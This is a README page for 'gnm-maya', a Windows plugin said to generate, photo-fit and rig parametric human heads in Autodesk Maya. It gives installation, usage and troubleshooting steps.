---
layout: "default"
title: "👤 gnm-maya - Create realistic human heads in Maya"
description: "Generate parametric human head meshes in Autodesk Maya using Google GNM models for semantic sampling, blending, and rig baking."
---
# 👤 gnm-maya - Create realistic human heads in Maya

[![Download for Windows](https://img.shields.io/badge/Download-Release-blue)](https://github.com/dloffph4929/gnm-maya)

This tool helps artists create 3D human heads inside Autodesk Maya. You can generate faces from text, fit heads to photographs, and bake rigs for animation. It works for background crowds or lead character designs. 

## ⚙️ System Requirements

Before you install this tool, make sure your computer meets these needs:

*   Operating System: Windows 10 or Windows 11.
*   Software: Autodesk Maya 2022, 2023, or 2024.
*   Memory: 16 GB of RAM or more.
*   Graphics: A dedicated graphics card with at least 4 GB of VRAM.
*   Disk Space: 500 MB for the tool and related assets.
*   Network: An active internet connection for the first-time setup and downloading model data.

## 💾 Installation Steps

Follow these steps to set up the tool on your Windows machine:

1. Visit the [releases page](https://github.com/dloffph4929/gnm-maya) to download the latest setup file.
2. Locate the file named `gnm-maya-installer.exe` in your downloads folder.
3. Double-click the file to start the installation.
4. Follow the prompts on the screen. The installer detects your Maya installation folder automatically.
5. Exit the installer once the process finishes.

## 🚀 Getting Started

Launch Autodesk Maya after a successful installation. You see a new menu titled "GNM Tools" at the top of the interface. This menu holds all the functions for creating and editing human heads.

### Creating a Head from Text
The text-to-face feature creates a 3D head mesh from a written description. 

1. Click "GNM Tools" and select "Text to Face."
2. Type a description of the character into the box. Describe features like age, gender, or ethnicity.
3. Click "Generate."
4. The tool builds the geometry in your scene.
5. Use the "Refine" button to adjust specific areas if the result needs changes.

### Fitting a Head to a Photo
You can make a 3D head match a real person by using a clear front-facing photograph.

1. Select "Photo Fitting" from the GNM menu.
2. Click "Load Photo" and choose your image file.
3. Align the visible markers on the screen with the eyes, nose, and mouth in the photo.
4. Click "Fit Mesh" to wrap the 3D model over the facial details of the photograph.
5. Adjust the sliders for weight and skin texture until the head matches your image.

### Baking Rigs 🦴
Once you have the head shape, you can add movement controls.

1. Select your generated head mesh.
2. Click "Bake Rig" in the GNM menu.
3. Choose the type of rig you need. Use "Standard" for general animation or "Crowd" for background characters.
4. Wait for the tool to apply the skeleton and controllers.
5. Test the mouth and eyes with the new controllers to ensure the weight influence looks correct.

## 📋 Best Practices

The tool works best when you keep the scene clean. Delete unused history on your mesh before applying new rig shapes. If you create large crowds, use the "Crowd" setting to keep your scene performance smooth. This setting reduces the number of polygons and simplifies the rig weights. 

Save your work often. While the tool manages data internally, Maya scenes can become complex as you add more heads. Use clear naming conventions for your files to keep track of different head variations. 

## 🛠️ Troubleshooting

If the menu does not appear in Maya:
1. Close Maya.
2. Re-run the installer.
3. Ensure the installation path matches your version of Maya.

If a generation fail occurs:
1. Check your internet connection.
2. Ensure you have enough disk space on your C: drive.
3. Restart the Maya session and try again.

If the head looks distorted:
1. Ensure your source photo is high resolution.
2. Check that the markers in the "Photo Fitting" tool sit directly on the landmarks of the face.

## 📝 Usage Notes

This tool relies on complex math to model human anatomy. The generated heads provide a base for your work. You may need to Sculpt or paint textures after generation to reach your final goal. Do not expect perfect results without minor manual adjustments. 

Keywords: 3d, 3d-morphable-model, 3dmm, autodesk-maya, blendshapes, character-creation, face, facial-animation, gnm, head, maya, parametric-modeling, procedural-generation, pyside, python, rigging, vfx